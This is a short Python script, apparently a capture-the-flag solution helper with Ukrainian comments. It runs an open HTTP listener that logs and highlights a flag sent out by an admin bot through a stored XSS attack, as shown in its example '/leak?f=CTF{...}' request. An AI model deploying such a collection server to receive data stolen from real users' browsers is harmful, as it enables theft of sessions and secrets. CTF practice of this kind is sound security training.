#!/usr/bin/env python3
"""HTTP-listener для викрадення флага.

Запуск на Kali/хості:
    python3 solve/listener.py            # слухає 0.0.0.0:8000
    python3 solve/listener.py --port 9000

У логах побачиш запит від бота, наприклад:
    /leak?f=CTF%7Bst0r3d_x55_1n_4dm1n_b07%7D
"""
import argparse
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, unquote, urlparse

FLAG_KEYS = {"f", "flag", "c", "q", "data"}


class Handler(BaseHTTPRequestHandler):
    server_version = "ctf-listener/1.0"

    def _log(self, body: str = "") -> None:
        stamp = datetime.now().strftime("%H:%M:%S")
        parsed = urlparse(self.path)
        print(f"\n[{stamp}] {self.command} {self.path}", flush=True)
        print(f"    from: {self.client_address[0]}:{self.client_address[1]}", flush=True)

        params = parse_qs(parsed.query)
        for key, values in params.items():
            for value in values:
                decoded = unquote(value)
                print(f"    {key} = {decoded}", flush=True)
                if key.lower() in FLAG_KEYS or "CTF{" in decoded:
                    print("\n" + "=" * 60, flush=True)
                    print(f"  FLAG: {decoded}", flush=True)
                    print("=" * 60 + "\n", flush=True)

        if body:
            print(f"    body: {body[:2000]}", flush=True)

    def do_GET(self):  # noqa: N802
        self._log()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        self._log(body)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_args):
        pass


def main() -> None:
    parser = argparse.ArgumentParser(description="CTF XSS listener")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8000)
    args = parser.parse_args()

    server = ThreadingHTTPServer((args.host, args.port), Handler)
    print(f"[*] Listening on http://0.0.0.0:{args.port} — waiting for the admin bot", flush=True)
    print("[*] Ctrl+C to stop", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Bye", flush=True)
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
